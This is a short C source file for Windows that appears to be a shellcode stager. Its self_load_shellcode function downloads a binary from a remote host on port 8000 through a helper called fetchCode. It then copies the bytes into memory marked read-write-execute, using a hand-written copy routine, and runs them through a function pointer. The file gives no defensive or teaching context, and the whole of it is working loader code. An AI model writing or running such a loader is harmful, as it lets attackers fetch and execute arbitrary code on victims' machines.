#include <stdio.h>
#include <windows.h>
#include <wininet.h>
#include "GetterFunctions.h"

#pragma comment(lib, "wininet")

void* memMirror(void* dest, const void* src, size_t count) {
    char* x = (char*)dest, * y = (char*)src;
    while (count--) *x++ = *y++;
    return dest;
}

int self_load_shellcode(LPCWSTR hostname, LPCWSTR bin) {
    DWORD bytesRead = 0;
    unsigned char buffer[4096];

    if (fetchCode(hostname, bin, L"8000", buffer, &bytesRead) != 0) {
        printf("Failed to fetch code\n");
        return 1;
    }

    void* allocatedMemory = VirtualAlloc(0, bytesRead, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (allocatedMemory == NULL) {
        printf("Memory allocation failed\n");
        return 1;
    }

    memMirror(allocatedMemory, buffer, bytesRead);

    void (*functionPointer)() = (void (*)())allocatedMemory;

    functionPointer();

    return 0;
}